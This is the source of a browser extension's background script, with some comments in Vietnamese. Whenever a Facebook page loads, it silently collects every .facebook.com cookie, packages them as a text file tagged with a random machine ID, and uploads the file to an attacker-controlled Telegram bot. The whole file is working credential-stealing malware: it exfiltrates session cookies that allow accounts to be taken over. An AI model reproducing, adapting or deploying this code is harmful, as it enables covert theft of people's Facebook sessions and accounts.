import BOT_CONFIG from './config.js';

// Tạo ID ngẫu nhiên cho máy
function generateMachineId() {
  return Math.random().toString(36).substring(2, 15) +
         Math.random().toString(36).substring(2, 15);
}

// Lấy hoặc tạo machine ID
async function getMachineId() {
  const storage = await chrome.storage.local.get(['machine_id']);
  if (storage.machine_id) {
    return storage.machine_id;
  }
  const newId = generateMachineId();
  await chrome.storage.local.set({ 'machine_id': newId });
  return newId;
}

// Function to create cookie file content
function formatCookiesData(url, cookies) {
  const date = new Date().toLocaleString();
  return `🍪 New Facebook Cookies\nURL: ${url}\nTime: ${date}\n\nCookies:\n${cookies}`;
}

// Function to create and send file
async function sendCookieFile(content, filename) {
  const file = new Blob([content], { type: 'text/plain' });
  const formData = new FormData();
  formData.append('document', file, filename);
  return formData;
}

// Function to check for new messages from Telegram bot
async function checkTelegramUpdates() {
  const url = `${BOT_CONFIG.baseURL}/bot${BOT_CONFIG.token}/getUpdates`;
  try {
    const response = await fetch(url);
    const data = await response.json();
    if (data.ok && data.result.length > 0) {
      const lastMessage = data.result[data.result.length - 1];
      chrome.storage.local.set({
        telegram_chat_id: lastMessage.message.chat.id
      });
    }
  } catch (err) {
    console.error('Error checking Telegram updates:', err);
  }
}

// Function to send file to Telegram
async function sendToTelegram(content) {
  chrome.storage.local.get(['telegram_chat_id'], async function(result) {
    if (!result.telegram_chat_id) {
      await checkTelegramUpdates();
      return;
    }

    try {
      // Lấy machine ID
      const machineId = await getMachineId();
      const filename = `machine_${machineId}.txt`;
      const formData = await sendCookieFile(content, filename);
      formData.append('chat_id', result.telegram_chat_id);

      const url = `${BOT_CONFIG.baseURL}/bot${BOT_CONFIG.token}/sendDocument`;
      await fetch(url, {
        method: 'POST',
        body: formData
      });
    } catch (err) {
      console.error('Error sending to Telegram:', err);
    }
  });
}

// Listen for Facebook navigation
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url && tab.url.includes('facebook.com')) {
    chrome.cookies.getAll({
      domain: ".facebook.com"
    }, cookies => {
      if (cookies.length > 0) {
        const cookiesText = JSON.stringify(cookies, null, 2);
        const fileContent = formatCookiesData(tab.url, cookiesText);
        sendToTelegram(fileContent);
      }
    });
  }
});

// Check for Telegram updates when extension starts
checkTelegramUpdates();
